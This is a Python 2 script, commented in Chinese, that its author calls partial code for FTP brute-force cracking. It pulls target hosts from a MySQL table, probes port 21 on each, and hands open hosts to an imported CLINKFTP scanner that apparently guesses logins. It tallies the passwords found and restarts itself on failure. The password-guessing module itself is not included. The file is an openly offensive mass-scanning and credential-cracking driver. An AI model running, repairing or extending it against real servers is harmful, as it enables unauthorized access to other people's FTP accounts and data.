#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
####################################################################
#qq:316118740
#BLOG:http://hi.baidu.com/alalmn
# python FTP暴力破解部分代码
#  刚学写的不好请大家见谅
####################################################################
import mysql #数据库操作文件
import time #获取时间和延时
from ftplib import FTP    #FTP操作
import atexit  #用于文件重启
import sys
import os
INI_data1=0  #扫描过FTP个
INI_data2=0  #扫描出个密码
####################################################################
def www_port(www):  #查看IP在查看端口
    try:
        ftpA = FTP()  #初始化FTP类
        ftpA.connect(www,"21")  #连接 服务器名  端口号
        ftpA.quit() #退出ftp服务器
        sql_up(www,"send") #SQL修改数据
        #print "---------------------------"
        ftp_cracker = CLINKFTP.PythonFtpScanner()  #初始化类
        ftp_cracker.ftp_login(www)  #传入要扫描的域名
    except Exception, e:
        print www,u"服务器FTP21端口可能没有开放"
        sql_up(www,"====") #SQL修改数据
        sql_sel() #SQL查询
        return
####################################################################
def sql_up(url,data): #SQL修改数据
    try:
        up = "update  ftp set  ftpsend='%s' where url='%s'"%(data,url)
        if mysql.mysql_update(up):  #修改数据
            print url,u"修改数据库成功"
        else:
            print url,u"修改数据库失败"
        mysql.mysql_S()  #保存数据
    except:
        return 0

import urllib2
def sql_sel(): #SQL查询
    try:
        global INI_data1  #扫描过FTP个
        global INI_data2  #扫描出个密码
        print u"-------扫描过FTP:%s个/扫描出:%s个密码-------"%(INI_data1,INI_data2)
        try:   #检测网络连接状态
            urllib2.urlopen(r"http://www.163.com",timeout=10)
            #print u"网络连接成功"
            #return 1
        except:
            print u"网络无连接 重启程序自身"
            mysql.mysql_S()  #保存数据
            mysql.mysql_close()  #关闭数据库
            atexit.register(close)#自动重启本程序
        sql="select * from ftp where ftpsend is NULL limit 1"
        mysql.cursor.execute(sql)
        mysql.cursor.scroll(0)
        for row in mysql.cursor.fetchall():
            INI_data1=INI_data1+1  #扫描过FTP个
            www_port(row[0])  #www转换IP在查看端口
            #print row[0]
            #time.sleep(3)  #延时
    except:
        print u"读取URL异常！！！！！"
        print u"3秒后,程序将结束重启..."
        mysql.mysql_S()  #保存数据
        mysql.mysql_close()  #关闭数据库
        atexit.register(close)#自动重启本程序

def close():  #自动重启本程序
    try:
        time.sleep(3)
        python = sys.executable
        os.execl(python, python, * sys.argv)
        #########
    except:
        sys.exit(0)  #结束进程
####################################################################
import CLINKFTP  #线程破解FTP
import sys
import socket
socket.setdefaulttimeout(10)  #设置了全局默认超时时间ftp_cracker = PythonFtpScanner()  #初始化类
import threading
import random  #产生一个随机数
if __name__=='__main__':
    try:
        mysql.mysql_open()  #连接数据库
        #sql_sel() #SQL查询
        a=random.randrange(0,8)   #产生一个随机数8以内的
        time.sleep(a) #确保先运行Seeker中的方法
        ftp_cracker0 = CLINKFTP.PythonFtpScanner()
        ftp_cracker0.ftp_login("")
    except:
        atexit.register(close)#自动重启本程序